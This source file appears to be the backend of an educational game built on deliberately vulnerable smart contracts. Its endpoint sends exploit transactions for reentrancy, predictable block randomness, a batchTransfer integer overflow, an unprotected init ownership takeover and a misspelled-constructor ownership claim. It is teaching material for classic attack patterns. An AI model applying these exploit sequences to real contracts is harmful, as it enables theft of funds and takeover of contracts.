import { encodeFunctionData } from "viem";
import { catAddrs, CARESS_ABI, json, parseCat, caressDryRun, logEvent, chainName, walletClient } from "./_shared.js";

const DEAD = "0x000000000000000000000000000000000000dEaD";

// POST /api/caress  { cat: 0..4 }  ->  { ok, txHash, hashes, pending, chain }
// Broadcasts the exploit txs through the NonceManager DO and returns as soon as the final tx is
// in the mempool (no receipt wait). The browser then polls /api/tx-status?hash=... so the
// Etherscan link can appear immediately and the confirmed state arrives without blocking submit.
export async function onRequestPost({ request, env }) {
  let body;
  try { body = await request.json(); } catch { body = {}; }
  const cat = parseCat(body);
  if (cat === null) return json({ ok: false, error: "invalid cat" }, 400);
  await logEvent(env, request, { type: "caress", cat, session: body.session, lang: body.lang });

  if (caressDryRun(env)) {
    return json({ ok: true, txHash: null, block: null, meow: true, dryRun: true, chain: chainName(env) });
  }

  try {
    const { account } = walletClient(env);
    const catAddr = catAddrs(env)[cat];
    const stub = env.NONCE_MANAGER.getByName("default");

    // Encode args here (caress.js owns the ABI) and pass raw bytes to the DO. The DO does
    // sendTransaction with a managed nonce; no ABI roundtrip needed.
    const submit = async (to, functionName, args = [], value = 0n, gas) => {
      const data = encodeFunctionData({ abi: CARESS_ABI, functionName, args });
      const res = await stub.submit({
        to,
        data,
        value: value.toString(),
        ...(gas ? { gas: gas.toString() } : {}),
      });
      if (res.error) throw new Error(res.error);
      return res.hash;
    };

    const hashes = [];
    if (cat === 0) {
      // ReentrancyCat via Seeker: deposit -> withdraw -> reenter -> caress, all in one tx.
      const seeker = env.SEEKER_ADDR;
      if (!seeker) throw new Error("SEEKER_ADDR not configured");
      const value = env.SEEKER_VALUE ? BigInt(env.SEEKER_VALUE) : 1n;
      hashes.push(await submit(seeker, "caress", [], value));
    } else if (cat === 1) {
      // PredictableCat via Prophet: a single block-prediction attempt; all-or-nothing (~1/2).
      // Explicit gas because the winning branch is heavier than estimateGas's cheap-branch view.
      const prophet = env.PROPHET_ADDR;
      if (!prophet) throw new Error("PROPHET_ADDR not configured");
      hashes.push(await submit(prophet, "caress", [catAddr], 0n, 500000n));
    } else if (cat === 2) {
      // OverflowCat: batchTransfer overflow grants balance, then caress. Sequential nonces from
      // the DO guarantee the chain processes them in order — caress() always sees the overflow.
      hashes.push(await submit(catAddr, "batchTransfer", [[account.address, DEAD], 2n ** 255n]));
      hashes.push(await submit(catAddr, "caress", []));
    } else if (cat === 3) {
      // UnprotectedCat: unprotected init claims ownership, then caress.
      hashes.push(await submit(catAddr, "init", [account.address]));
      hashes.push(await submit(catAddr, "caress", []));
    } else if (cat === 4) {
      // MisspelledCat: misspelled "constructor" claims ownership, then caress.
      hashes.push(await submit(catAddr, "MisspeledCat", [account.address]));
      hashes.push(await submit(catAddr, "caress", []));
    }

    return json({
      ok: true,
      txHash: hashes[hashes.length - 1],
      hashes,
      pending: true,
      chain: chainName(env),
    });
  } catch (e) {
    return json({ ok: false, error: String(e?.message || e) }, 502);
  }
}
